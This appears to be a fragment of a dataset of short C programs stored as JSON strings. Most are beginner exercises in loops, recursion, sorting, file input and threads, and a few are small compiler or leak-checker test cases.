    "#include <stdio.h>\nint main() {\n  int N = 10;\n  int a[N][N];\n  for(int i=1; i<=N;i++) {\n    for(int j=1; j<=N;j++) {\n      if(i*j<N/2) {\n        a[N-1-i][i+j-1] = 1;\n        a[i-1][N-i-j-1] = 1;\n printf(\"i=%d, j=%d\\n\", i, j);\n      }\n      if(i==j) {\n        a[i-1][j-1] = 1;\n printf(\"i=%d, j=%d\\n\", i, j);\n      }\n    }\n  }\n}",
    "#include<stdio.h>\nint main(){\n    char mesg[] = \"HelloWorld\\n\";\n    printf(\"mesg's addr: %llx\\n\", mesg);\n    getchar();\n    return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n    int i;\n    int t, k;\n    int a, b;\n    int dp[100005];\n    scanf(\"%d%d\", &t, &k);\n    for ( i = 0; i < k; i++ )\n        dp[i] = 1;\n    for ( i = k; i <= 100000; i++ )\n        dp[i] = (dp[i-1]+dp[i-k])%1000000007;\n    for ( i = 1; i <= 100000; i++ )\n        dp[i] = (dp[i]+dp[i-1])%1000000007;\n    for ( i = 0; i < t; i++ )\n    {\n        scanf(\"%d%d\", &a, &b );\n        printf(\"%d\\n\", (dp[b]-dp[a-1]+1000000007)%1000000007);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n char c;\n FILE *stream;\n stream = fopen(\"ungetc.txt\", \"r\");\n while(1)\n {\n  c = fgetc(stream);\n  if(c==(-1))\n  {\n   perror(\"fgetc\");\n   break;\n  }\n  else if (c=='#')\n  {\n   ungetc('%', stream);\n   ungetc('*', stream);\n   ungetc('^', stream);\n  }\n  else\n  {\n   printf(\"%c\", c);\n  }\n }\n return 0;\n}",
    "#include<stdio.h>\nint min(int x, int y) { return (x < y)? x : y; }\nint max(int x, int y) { return (x > y)? x : y; }\nint findLength(int arr[], int n)\n{\n int max_len = 1;\n for (int i=0; i<n-1; i++)\n {\n  int mn = arr[i], mx = arr[i];\n  for (int j=i+1; j<n; j++)\n  {\n   mn = min(mn, arr[j]);\n   mx = max(mx, arr[j]);\n   if ((mx - mn) == j-i)\n    max_len = max(max_len, mx-mn+1);\n  }\n }\n return max_len;\n}\nint main()\n{\n int arr[] = {1, 56, 58, 57, 90, 92, 94, 93, 91, 45};\n int n = sizeof(arr)/sizeof(arr[0]);\n printf(\"Length of the longest contiguous subarray is %d\",\n        findLength(arr, n));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    char a;\n    printf(\"Enter Grade: \");\n    scanf(\" %c\",&a);\n    if( a=='A' || a=='a' )\n        printf(\"Excellent\");\n    else if( (a=='B' || a=='b') )\n        printf(\"Good\");\n    else if( (a=='C' || a=='c') )\n        printf(\"Satisfactory\");\n    else if( (a=='D' || a=='d') )\n        printf(\"Needs Improvement\");\n    return 0;\n}",
    "#include <stdio.h>\nint IDs[4] = {10000, 10001, 10002, 10003};\nvoid func1(double data[4][5])\n{\n    double adv = (data[0][0] + data[1][0] + data[2][0] + data[3][0]) / 4;\n    printf(\"%lf\\n\", adv);\n}\nvoid func2(double data[4][5])\n{\n    for (int i = 0; i < 4; i++)\n    {\n        int count = 0;\n        for (int j = 0; j < 5; j++)\n            if (data[i][j] < 60)\n                count++;\n        if (count > 2)\n        {\n            printf(\"ID: %d\\t%.1lf, %.1lf, %.1lf, %.1lf, %.1lf\\t%.2lf\\n\",\n                   IDs[i],\n                   data[i][0], data[i][1], data[i][2], data[i][3], data[i][4],\n                   (data[i][0] + data[i][1] + data[i][2] + data[i][3] + data[i][4]) / 5);\n        }\n    }\n}\nvoid func3(double data[4][5])\n{\n    for (int i = 0; i < 4; i++)\n    {\n        if ((data[i][0] + data[i][1] + data[i][2] + data[i][3] + data[i][4]) / 5 > 90)\n            printf(\"ID: %d\\n\", IDs[i]);\n        else\n        {\n            for (int j = 0; j < 5; j++)\n                if (data[i][j] <= 85)\n                    break;\n            printf(\"ID: %d\\n\", IDs[i]);\n        }\n    }\n}\nint main(void)\n{\n    double data[4][5] = {\n        {97, 95, 95, 95, 98},\n        {96, 94, 88, 94, 85},\n        {85, 55, 54, 49, 99},\n        {98, 97, 96, 89, 95},\n    };\n    func1(data);\n    func2(data);\n    func3(data);\n}",
    "#include <stdio.h>\nint main(void) {\n int plus, min, max = 0, people = 0 ;\n int i = 4 ;\n while(i--) {\n  scanf(\"%d %d\", &min, &plus) ;\n  people += plus - min ;\n  if(people > max)\n   max = people ;\n }\n printf(\"%d\",max) ;\n}",
    "#include <stdio.h>\nint main(void)\n{\n   float principal0 = 1000.0f,rate1 = 0.0036f,rate2 = 0.0225f,rate3 = 0.0198f,principal1,principal2,principal3;\n   principal1 = principal0 * (1 + rate1);\n   principal2 = principal0 * (1 + rate2);\n   principal3 = principal0 * (1 + rate3 / 2) * (1 + rate3 / 2);\n   printf(\" principal1 = %f\\n principal2 = %f\\n principal3 = %f\",principal1,principal2,principal3);\n   char a,b,c;\n   a = getchar();\n   b = getchar();\n   c = getchar();\n   putchar(a);\n   putchar(b);\n   putchar(c);\n   putchar('\\n');\n}",
    "#include <stdio.h>\nint main(void)\n{\n int n;\n scanf(\"%d\", &n);\n int ai, bi, current = 0, max = 0;\n while(n--)\n {\n  scanf(\"%d %d\", &ai, &bi);\n  current += bi - ai;\n  if(current > max) max = current;\n }\n printf(\"%d\\n\", max);\n return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\n#include <stdlib.h>\ndouble *create_weights(int n);\ndouble weighted_sum(double x[], int n);\nvoid produce_data(double data[], int n);\nint main() {\n    const int nr_iters = 3;\n    for (int i = 0; i < nr_iters; i++) {\n        int nr_items = i + 3;\n        double *data = (double *) malloc(nr_iters*sizeof(double));\n        double sum = weighted_sum(data, nr_items);\n        printf(\"sum = %lf\\n\", sum);\n    }\n    return 0;\n}\ndouble *create_weights(int n) {\n    double *weights = (double *) malloc(n*sizeof(double));\n    for (int i = 0; i < n; i++)\n        weights[i] = exp(-i);\n    return weights;\n}\ndouble weighted_sum(double x[], int n) {\n    double *weights = create_weights(n);\n    double sum = 0.0;\n    for (int i = 0; i < n; i++)\n        sum += x[i]*weights[i];\n    return sum;\n}\nvoid produce_data(double data[], int n) {\n    for (int i = 0; i < n; i++)\n        data[i] = ((double) rand())/(0x7fffffff);\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n int x,y,o;\n printf(\"Enter number :\\n\");\n scanf(\"%d\",&x);\n printf(\"Enter number for power:\\n\");\n scanf(\"%d\",&y);\n o = pow(x,y);\n printf(\"Result is %d\",o);\n return 0;\n}",
    "#include<stdio.h>\nint sum(int v[], int numberOfNumbers);\nint main(){\n    int vector[6] = {9, 5, 1, 3, 8, 4}, result, i, numberOfNumbers = 6;\n    printf(\"========= Sum numbers vector =========\\n\\n\");\n    for (i = 0; i < numberOfNumbers; i++){\n        printf(\"vector[%i] = %i\\n\", i, vector[i]);\n    }\n    result = sum(vector, 6);\n    printf(\"\\n\\nResult = %i\", result);\n    return 0;\n}\nint sum(int vector[], int numberOfNumbers){\n    if(numberOfNumbers == 1){\n        return vector[0];\n    } else{\n        return (vector[numberOfNumbers - 1] + sum(vector, numberOfNumbers - 1));\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\nvoid insertionSortH(int *array, int left, int right, int jump);\nvoid shellSort(int *array, int left, int right);\nint less(int interim, int stance);\nint main(int argc, char const *argv[])\n{\n int array[10];\n    for(int i=0; i<10; i++){\n        array[i] = rand() % (100 + 1 - 0) + 0;\n    }\n    shellSort(array, 0, 10 - 1);\n    printf(\"\\n\");\n    for(int i=0; i<10; i++)\n        printf(\"%d \", array[i]);\n printf(\"\\n\");\n return 0;\n}\nvoid insertionSortH(int *array, int left, int right, int jump){\n for (int i = left + jump; i <= right; i++)\n {\n  int aux = i;\n  int interim = array[i];\n  while(aux >= left + jump && less(interim, array[aux-jump]))\n   {\n    array[aux] = array[aux - jump];\n    aux -= jump;\n   }\n  array[aux] = interim;\n }\n}\nvoid shellSort(int *array, int left, int right){\n int jump;\n for (jump = 1 ; jump <= (right - left)/9; jump = 3 * jump + 1);\n for ( ;jump > 0; jump = jump/3)\n  insertionSortH(array, left, right, jump);\n}\nint less(int interim, int stance){\n if (interim < stance) return 1;\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int n1,n2,sum;\n  float avg;\n  printf(\"Enter number 1 : \");\n  scanf(\"%d\", &n1);\n  printf(\"Enter number 2 : \");\n  scanf(\"%d\", &n2);\n  sum = n1 + n2;\n  avg = sum/2.0;\n  printf(\"Average = %.2f\",avg);\n  return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nvoid foo(int size)\n{\n    int* data = malloc(sizeof(int) * size);\n}\nvoid bar(int size)\n{\n    char *data = malloc(sizeof(char) * size);\n    foo(size);\n}\nvoid foobar(int size)\n{\n    bar(size);\n}\nint main(void)\n{\n    printf(\"leakfinder C example app\\n\");\n    printf(\"This application is expected to leak\\n\");\n    foobar(8);\n    foobar(16);\n    printf(\"leakfinder C example app all done\\n\");\n    return 0;\n}",
    "int main(void)\n{\n    int i = 42, j = 41;\n    return 10 == 10 ? i : j;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nint main()\n{\n    char *fileName = \"input.txt\";\n    FILE *input;\n    char *search = \"mundo\";\n    char *replace = \"MUNDOMUNDO\";\n    char word[255];\n    long searchPos = 0;\n    int character;\n    input = fopen(fileName, \"r\");\n    while (1) {\n        fscanf(input,\"%s\",word);\n        if(feof(input)){\n            break;\n        }\n        if(strcmp(word,search) == 0) {\n            do { char *isDebug; isDebug = getenv(\"DEBUG\"); if (isDebug != ((void*)0) && !strcasecmp(isDebug, \"y\")) { fprintf((stderr), \"Found %s\\n\", word); } } while (0);\n            fseek(input,-1*strlen(search),(1));\n            searchPos = ftell(input);\n            do { char *isDebug; isDebug = getenv(\"DEBUG\"); if (isDebug != ((void*)0) && !strcasecmp(isDebug, \"y\")) { fprintf((stderr), \"searchPos = %ld\\n\", searchPos); } } while (0);\n            rewind(input);\n            while(ftell(input) != searchPos) {\n                character = fgetc(input);\n                fputc(character,(stdout));\n            }\n            fputs(replace,(stdout));\n            fseek(input,strlen(word),(1));\n            while(1){\n                character = fgetc(input);\n                if(feof(input)) {\n                    break;\n                }\n                fputc(character,(stdout));\n            }\n            break;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n,m=0,p=0;\n        scanf(\"%d\",&n);\n        m=n*n;\n        p=n*n*n;\n        printf(\"\\n%d\",m);\n        printf(\"\\n%d\",p);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n    float x,y,z;\n    float bx = 0,by = 0,bz =0;\n    int c=0;\n    FILE *fp;\n    if(argc < 2)\n    {\n        fprintf((stderr),\"Utilizzo programma: lab01_1.exe <file>\\n\");\n        return -1;\n    }\n    if((fp = fopen(argv[1],\"r\")) == ((void*)0))\n    {\n        fprintf((stderr),\"Impossibile aprire il file %s\\n\",argv[1]);\n        return -2;\n    }\n    while(fscanf(fp,\"%f %f %f\", &x, &y, &z) != (-1))\n    {\n        c++;\n        bx+=x;\n        by+=y;\n        bz+=z;\n    }\n    bx=bx/(float)c;\n    by=by/(float)c;\n    bz=bz/(float)c;\n    printf(\"Baricentro: %.1f %.1f %.1f\\n\", bx, by, bz);\n    return 0;\n}",
    "#include <stdio.h>\n\n\n\n\n\n\nint main (void)\n{\n    float hours = 0;\n    float gross_pay = 0, taxes = 0, net_pay = 0;\n    printf(\"Enter the number of hours worked this week: \");\n    scanf(\"%f\", &hours);\n    gross_pay = hours * 10;\n    if (gross_pay < 300)\n        taxes = gross_pay * 0.15;\n    else if (gross_pay < 300 + 150)\n        taxes = 300 * 0.15 + (gross_pay - 300) * 0.20;\n    else\n        taxes = 300 * 0.15 + 150 * 0.20 + (gross_pay - 300 - 150) * 0.25;\n    net_pay = gross_pay - taxes;\n    printf(\"Gross: %.2f\\nTaxes: %.2f\\nNet:  %.2f\\n\", gross_pay, taxes, net_pay);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int i,j,num=15;\n    for(i =-num; i<num; i++)\n    {\n        for(j =-num; j<num; j++)\n        {\n            if(i * i + j * j <= num * num)\n                printf(\"*\");\n            else\n                printf(\" \");\n        }\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\n#include <string.h>\nint main() {\n   char str1[40] = \"ACM222 C Structural Programming\";\n   char str2[40];\n   strcpy(str2, str1);\n   puts(str2);\n   return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\n#include <string.h>\n#include <math.h>\nvoid insertionsort(char** array, int strMax) {\n char* current;\n int position;\n for (int i = 1; i < strMax; i++) {\n  current = (char*)malloc(sizeof(array[i]));\n  strcpy(current, array[i]);\n  position = i;\n  while ( (position>0) && (strcasecmp(array[position-1], current)>0) ) {\n   strcpy(array[position], array[position-1]);\n   --position;\n   printf(\" item moved : %s\\n\" , array[position]);\n  }\n  printf(\" item inserted : %s, at position : %d\\n\" , current,position);\n  strcpy(array[position], current);\n  printf(\"Iteration: %d\\n\", i);\n  for (int i = 0; i < strMax; i++) {\n   printf(\"%s\\n\", array[i]);\n  }\n }\n}\nint main(int argc, char** argv) {\n if(argc != 2) {\n  printf(\"Please use only 1 argument.\\ni.e. ./pointersorter \\\"the*string*of*some*sort\\\"\\nExiting...\\n\");\n  return 1;\n }\n char* input = argv[1];\n int maxSize = (int)ceil(((double)strlen(input))/2)+1;\n printf(\"Max Size of Array: %d\\n\", maxSize);\n char** strArray = (char**)malloc(maxSize*sizeof(char*));\n int currentstrArray = 0;\n int wordStart = 0;\n int wordEnd;\n for (wordEnd = 0; wordEnd <= strlen(input)-1; wordEnd++) {\n  printf(\"index %d : %c\\n\", wordEnd, input[wordEnd]);\n  if(!(0 ? isalpha(input[wordEnd]) : (((unsigned)(input[wordEnd])|32)-'a') < 26)) {\n   if(wordEnd == 0) {\n    wordStart = 1;\n    printf(\"wordStart: %d\\n\", wordStart);\n    continue;\n   } else if( (!(0 ? isalpha(input[wordEnd-1]) : (((unsigned)(input[wordEnd-1])|32)-'a') < 26)) && (wordEnd==strlen(input)-1) ) {\n    currentstrArray--;\n    printf(\"%s\\n\", \"Ending\");\n    break;\n   } else if(!(0 ? isalpha(input[wordEnd-1]) : (((unsigned)(input[wordEnd-1])|32)-'a') < 26)) {\n    wordStart = wordEnd+1;\n    printf(\"%s\\n\", \"Multiple no alphas\\n\");\n    continue;\n   } else if(wordEnd == strlen(input)-1) {\n    int subLength = wordEnd-wordStart+1;\n    printf(\"Substring Length: %d\\n\", subLength);\n    char subStr[subLength];\n    strncpy(subStr, &input[wordStart], subLength-1);\n    subStr[subLength-1] = '\\0';\n    printf(\"Substring: %s\\nSubstring length: %zd\\n\", subStr, strlen(subStr));\n    strArray[currentstrArray] = malloc(sizeof(subStr));\n    strcpy(strArray[currentstrArray], subStr);\n    printf(\"inserting string: %s at index: %d\\n\", strArray[currentstrArray], currentstrArray);\n    break;\n   }\n   int subLength = wordEnd-wordStart+1;\n   printf(\"Substring Length: %d\\n\", subLength);\n   char subStr[subLength];\n   strncpy(subStr, &input[wordStart], subLength-1);\n   subStr[subLength-1] = '\\0';\n   printf(\"Substring: %s\\nSubstring length: %zd\\n\", subStr, strlen(subStr));\n   strArray[currentstrArray] = malloc(sizeof(subStr));\n   strcpy(strArray[currentstrArray], subStr);\n   printf(\"inserting string: %s at index: %d\\n\", strArray[currentstrArray], currentstrArray);\n   currentstrArray++;\n   wordStart = wordEnd+1;\n   continue;\n  } else if(wordEnd==strlen(input)-1) {\n   printf(\"%s\\n\", \"ending\\n\");\n   int subLength = wordEnd-wordStart+2;\n   printf(\"Substring Length: %d\\n\", subLength);\n   char subStr[subLength];\n   strncpy(subStr, &input[wordStart], subLength-1);\n   subStr[subLength-1] = '\\0';\n   printf(\"Substring: %s\\nSubstring length: %zd\\n\", subStr, strlen(subStr));\n   strArray[currentstrArray] = malloc(sizeof(subStr));\n   strcpy(strArray[currentstrArray], subStr);\n   printf(\"inserting string: %s at index: %d\\n\", strArray[currentstrArray], currentstrArray);\n   break;\n  }\n }\n insertionsort(strArray, currentstrArray+1);\n printf(\"\\n\\n\\n\\n\\n\\n\");\n for (int i = 0; i <= currentstrArray; i++) {\n  printf(\"Index: %d\\n\", i);\n  printf(\"%s\\n\", strArray[i]);\n }\n printf(\"Length: %ld\\n\", strlen(input));\n}",
    "#include <stdio.h>\n#pragma c3po encrypt\n\nint main(void) {\n    puts(\"hello world\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint stack[100], top = -1;\nvoid push(int x){\nif(top > 100 -1){\nprintf(\"StackOverflow\");\n}else{\n stack[++top] = x;\n printf(\"Element inserted:%d \\n\",x);\n}\n}\nvoid pop(){\n if(top < 0){\n  printf(\"StackUnderFlow\");\n }\n else{\n  printf(\"Element deleted %d\", stack[top]);\n  top--;\n }\n}\nvoid prints(){\n int i;\n printf(\"Element of stack are:\");\n for(i=0; i<=top;i++){\n  printf(\"%d \",stack[i]);\n }\n}\nint main(void){\n push(1);\n push(2);\n push(3);\n push(4);\n push(5);\n push(6);\n push(7);\n  pop();\n prints();\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(void)\n{\n int n;\n int last;\n srand(time(0));\n n = rand() - (0x7fffffff) / 2;\n last = n % 10;\n if (last > 5)\n {\n  printf(\"Last digit of %d is %d and is greater than 5\\n\", n, last);\n }\n else if (last == 0)\n {\n  printf(\"Last digit of %d is %d and is 0\\n\", n, last);\n }\n else\n {\n  printf(\"Last digit of %d is %d and is less than 6 and not 0\\n\", n, last);\n }\n return (0);\n}",
    "#include <stdio.h>\nvoid printRow(int n) {\n  if (n <= 0)\n    printf(\"\\n\");\n  else {\n    printf(\"*\");\n    printRow(n - 1);\n  }\n}\nint main(void) {\n  int stars;\n  printf(\"How many stars should we print? \");\n  scanf(\"%d\", &stars);\n  printRow(stars);\n  return 0;\n}",
    "#include <stdio.h>\ndouble sum = 0;\ndouble recursionUp(int n, double x) {\n    double F = -1;\n    printf(\"%d. F = %lf sum= %lf\\n\", n, F, sum);\n    if (n == 1) {\n        F = 1;\n        sum += F;\n    } else if (n == 2) {\n        F = (-1 * x) / 2;\n        recursionUp(n-1, x);\n        sum += F;\n    } else {\n        F = recursionUp(n-1, x) * (-1) * x * (2 * n - 3) / (2 * n);\n        sum += F;\n    }\n    printf(\"%d. F = %lf sum = %lf\\n\", n, F, sum);\n    return F;\n}\nint main() {\n    int n;\n    float x;\n    printf(\"|x| < 1\\nInput X:\");\n    scanf(\"%f\", &x);\n    if (x > 1 || x < -1) return printf(\"Invalid number!\");\n    printf(\"Input N:\");\n    scanf(\"%d\", &n);\n    if (n < 1) return printf(\"Invalid number!\");\n    recursionUp(n, x);\n}",
    "#include <stdio.h>\nint main(int argc, const char *argv[]) {\n    printf(\"%15s %s\\n\", \"Type\", \"sizeof\");\n    printf(\"%15s %4lu\\n\", \"char\", sizeof(char));\n    printf(\"%15s %4lu\\n\", \"short int\", sizeof(short int));\n    printf(\"%15s %4lu\\n\", \"int\", sizeof(int));\n    printf(\"%15s %4lu\\n\", \"long int\", sizeof(long int));\n    printf(\"%15s %4lu\\n\", \"long long int\", sizeof(long long int));\n    printf(\"%15s %4lu\\n\", \"float\", sizeof(float));\n    printf(\"%15s %4lu\\n\", \"double\", sizeof(double));\n}",
    "#include<stdio.h>\nint main()\n{\n int i,n,a[100000]={0},x,k,j=0;\n scanf(\"%d\",&n);\n for(i=0;i<n;i++){\n  scanf(\"%d\",&x);\n  a[x]++;\n }\n scanf(\"%d\",&k);\n for(i=99999;i>0;i--){\n  if(a[i]==0)\n  continue;\n  else{\n   j++;\n   if(j==k){\n    printf(\"%d %d\",i,a[i]);\n    return 0;\n   }\n  }\n }\n}",
    "int main (int argc, char *argv[])\n{\n  static int a[] = { __builtin_constant_p (argc) ? 1 : 0 };\n  return a[0];\n}",
    "#include <stdio.h>\nint main(){\n    int hour, min;\n    scanf(\"%d:%d\",&hour,&min);\n    if (hour > 12){\n        hour -= 12;\n        printf(\"%02d:%02d PM\", hour, min);\n    }\n    else{\n        printf(\"%02d:%02d AM\", hour, min);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint main()\n{\n   float r,h,area,vol;\n   printf(\"Enter radius & height of cylinder\\n\");\n   scanf(\"%f %f\",&r,&h);\n   area=2*3.14159*r*(r+h);\n   vol=3.14159*r*r*h;\n   printf(\"Surface-area of the cylinder is %0.3f\\n\",area);\n   printf(\"Volume of the cylinder is %0.3f\",vol);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\npthread_mutex_t m;\npthread_cond_t c;\nint x;\nvoid *thr1(void *p) {\n  int i;\n  for (i = 0; i < 10; i += 2) {\n    pthread_mutex_lock(&m);\n    while (x != i)\n      pthread_cond_wait(&c, &m);\n    x = i + 1;\n    pthread_cond_signal(&c);\n    pthread_mutex_unlock(&m);\n  }\n  return 0;\n}\nvoid *thr2(void *p) {\n  int i;\n  for (i = 1; i < 10; i += 2) {\n    pthread_mutex_lock(&m);\n    while (x != i)\n      pthread_cond_wait(&c, &m);\n    x = i + 1;\n    pthread_mutex_unlock(&m);\n    pthread_cond_broadcast(&c);\n  }\n  return 0;\n}\nint main() {\n  pthread_t th1, th2;\n  pthread_mutex_init(&m, 0);\n  pthread_cond_init(&c, 0);\n  pthread_create(&th1, 0, thr1, 0);\n  pthread_create(&th2, 0, thr2, 0);\n  pthread_join(th1, 0);\n  pthread_join(th2, 0);\n  fprintf((stderr), \"OK\\n\");\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main(void)\n{\n    char buf[255];\n    int ch = '\\0';\n    char *p = ((void*)0);\n    if (fgets(buf, sizeof(buf), (stdin)))\n    {\n        p = strchr(buf, '\\n');\n        if (p)\n        {\n            *p = '\\0';\n        }\n        else\n        {\n            while (((ch = getchar()) != '\\n') &&\n                !feof((stdin)) &&\n                !ferror((stdin)));\n        }\n    }\n    printf(\"Our buffer contains: %s\\n\", buf);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <limits.h>\n\nint main(void)\n{\n  unsigned char first_line[1024];\n  unsigned char line[1024];\n  int stat[(127*2 +1)];\n  int i;\n  if(fgets(first_line, 1024, (stdin)) == ((void*)0))\n    return 1;\n  for(i = 0; first_line[i] != '\\n'; i++);\n  first_line[i] = '\\0';\n  for(i = 0; i < (127*2 +1); i++)\n    stat[i] = 0;\n  while(fgets(line, 1024, (stdin)) != ((void*)0))\n    for(i = 0; line[i] != '\\0'; i++)\n      stat[line[i]]++;\n  printf\n  (\n    (\n      \":name=\\\"%s\\\"\\n\"\n      \":position=\\\"%s\\\"\\n\"\n      \":db=\\\"%s\\\"\\n\"\n      \":id=\\\"%s\\\"\\n\"\n      \":reference_db=\\\"%s\\\"\\n\"\n      \":reference=\\\"%s\\\"\\n\"\n      \":first_line=\\\"%s\\\"\\n\"\n      \"\\n\"\n      \"A: %d\\n\"\n      \"B: %d\\n\"\n      \"C: %d\\n\"\n      \"D: %d\\n\"\n      \"E: %d\\n\"\n      \"F: %d\\n\"\n      \"G: %d\\n\"\n      \"H: %d\\n\"\n      \"I: %d\\n\"\n      \"J: %d\\n\"\n      \"K: %d\\n\"\n      \"L: %d\\n\"\n      \"M: %d\\n\"\n      \"N: %d\\n\"\n      \"O: %d\\n\"\n      \"P: %d\\n\"\n      \"Q: %d\\n\"\n      \"R: %d\\n\"\n      \"S: %d\\n\"\n      \"T: %d\\n\"\n      \"U: %d\\n\"\n      \"V: %d\\n\"\n      \"W: %d\\n\"\n      \"Y: %d\\n\"\n      \"Z: %d\\n\"\n      \"X: %d\\n\"\n      \"*: %d\\n\"\n      \"-: %d\\n\"\n    ),\n    getenv(\"MASSPRED_FILE_NAME\"),\n    getenv(\"MASSPRED_INPUT_POSITION\"),\n    getenv(\"MASSPRED_FASTA_DB\"),\n    getenv(\"MASSPRED_FASTA_ID\"),\n    getenv(\"MASSPRED_FASTA_REFERENCE_DB\"),\n    getenv(\"MASSPRED_FASTA_REFERENCE\"),\n    first_line,\n    stat['A']+stat['a'],\n    stat['B']+stat['b'],\n    stat['C']+stat['c'],\n    stat['D']+stat['d'],\n    stat['E']+stat['e'],\n    stat['F']+stat['f'],\n    stat['G']+stat['g'],\n    stat['H']+stat['h'],\n    stat['I']+stat['i'],\n    stat['J']+stat['j'],\n    stat['K']+stat['k'],\n    stat['L']+stat['l'],\n    stat['M']+stat['m'],\n    stat['N']+stat['n'],\n    stat['O']+stat['o'],\n    stat['P']+stat['p'],\n    stat['Q']+stat['q'],\n    stat['R']+stat['r'],\n    stat['S']+stat['s'],\n    stat['T']+stat['t'],\n    stat['U']+stat['u'],\n    stat['V']+stat['v'],\n    stat['W']+stat['w'],\n    stat['Y']+stat['y'],\n    stat['Z']+stat['z'],\n    stat['X']+stat['x'],\n    stat['*'],\n    stat['-']\n  );\n  return 0;\n}",
    "#include <stdio.h>\n\n\nint G[7][7] = {\n  {0, 0, 15, 46, 40, 0, 0},\n  {0, 0, 0, 0, 17, 40, 29},\n  {15, 0, 0, 0, 53, 0, 0},\n  {46, 0, 0, 0, 0, 11, 3},\n  {40, 17, 53, 0, 0, 0, 31},\n  {0, 40, 0, 11, 0, 0, 8},\n  {0, 29, 0, 3, 31, 8, 0},\n};\nint main() {\n  int i, noEdge = 0, selected[7];\n  int row, col;\n  for(i = 0; i < 7; i++) selected[i] = 0;\n  selected[0] = 1;\n  printf(\"Edge    | Weight\\n\");\n  while (noEdge < 7 - 1) {\n    int min = 9999999;\n    row = 0;\n    col = 0;\n    for (int i = 0; i < 7; i++){\n      if (selected[i]){\n        for (int j = 0; j < 7; j++){\n          if (!selected[j] && G[i][j]){\n            if (min > G[i][j]) {\n              min = G[i][j];\n              row = i;\n              col = j;\n            }\n          }\n        }\n      }\n    }\n    printf(\"%d --- %d | %d\\n\", row, col, G[row][col]);\n    selected[col] = 1;\n    noEdge++;\n  }\n  return 0;\n}",
    "#include<stdio.h>\nvoid slice(char *st, int m, int n){\n    int i = 0;\n     while((m+i)<n){\n         st[i] = st[i+m];\n         i++;\n     }\n     st[i] = '\\0';\n}\nint main(){\n    char st[] = \"Harrysfsdfsdf\";\n    slice(st, 1, 6);\n    printf(\"%s\", st);\n    return 0;\n}",
    "int main(void)\n{\nint a;\na = 1 / 0;\nreturn 0;\n}",
    "#include <stdio.h>\n\nvoid min_max(int a[], int n, int *min, int *max);\nint main(void)\n{\n  int b[10], i, min, max;\n  printf(\"Enter %d numbers: \", 10);\n  for(i = 0; i < 10; i++)\n    scanf(\"%d\", &b[i]);\n  min_max(b, 10, &min, &max);\n  printf(\"Smallest: %d\\n\", min);\n  printf(\"Largest: %d\\n\", max);\n  return 0;\n}\nvoid min_max(int a[], int n, int *min, int *max)\n{\n  int i;\n  *min = *max = a[0];\n  for(i = 1; i < n; i++) {\n    if (a[i] < *min)\n      *min = a[i];\n    else if (a[i] > *max)\n      *max = a[i];\n  }\n}",
    "#include <stdio.h>\nvoid twiddle1 (int *xp, int *yp) {\n        *xp += *yp;\n        *xp += *yp;\n}\nvoid twiddle2 (int *xp, int *yp) {\n        *xp += 2* *yp;\n}\nint main (void)\n{\n        int x;\n        int y;\n        x = 1;\n        y = 3;\n        twiddle1(&x,&y);\n        printf(\"twiddle1(&x,&y)  -> x = %d\\n\", x);\n        x = 1;\n        y = 3;\n        twiddle2(&x,&y);\n        printf(\"twiddle2(&x,&y)  -> x = %d\\n\", x);\n        x = 1;\n        twiddle1(&x,&x);\n        printf(\"\\ntwiddle1(&x,&y)  -> x = %d\\n\", x);\n        x = 1;\n        twiddle2(&x,&x);\n        printf(\"twiddle2(&x,&y)  -> x = %d\\n\", x);\n        return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char **argv) {\n if (argc != 2) {\n  fprintf((stderr), \"usage: %s <file>\\n\",argv[0]);\n  exit(1);\n }\n FILE *fp;\n char str[100];\n char* filename = argv[1];\n fp = fopen(filename, \"r\");\n if (fp == ((void*)0)){\n  printf(\"Could not open file %s\\n\",filename);\n  return 1;\n }\n      int count=0;\n while (fgets(str, 100, fp) != ((void*)0)){\n  count++;\n }\n fclose(fp);\n fp = fopen(filename, \"r\");\n char *all[count];\n size_t len = 0;\n for(int i = 0; i < count; i++){\n  all[i] = ((void*)0);\n  len = 0;\n  getline(&all[i], &len, fp);\n }\n fclose(fp);\n int ans = 0;\n for (int d = 0; d<count; d++){\n  char let[30] = { 0 };\n  int curlet = 0;\n  let[0] = all[d][0];\n  while (all[d][0]!='\\n'){\n   int i = 0;\n   while(all[d][i]!='\\n'){\n    int found = 0;\n    for(int j = 0; j<=curlet; j++){\n     if(all[d][i]==let[j]){\n      found=1;\n     }\n    }\n    if (found==0){\n     curlet++;\n     let[curlet]=all[d][i];\n    }\n    i++;\n   }\n   if (d<count-1)\n    d++;\n  }\n  ans+=(curlet+1);\n }\n printf(\"Sum: %d\\n\", ans);\n return 0;\n}",
    "#include <stdio.h>\nint factorial(int number)\n{\n    if (number == 0) {\n        return 1;\n    }\n    return number * factorial(number-1);\n}\nint computeSum(int n)\n{\n    int i, sum = 0;\n    for (i = 1; i <= n; i++) {\n        sum += factorial(i) / i;\n    }\n    return sum;\n}\nint main()\n{\n    int n, result;\n    printf(\"Introduceti un numar: \");\n    scanf(\"%d\", &n);\n    result = computeSum(n);\n    printf(\"Suma este: %d\\n\", result);\n    return 0 ;\n}",
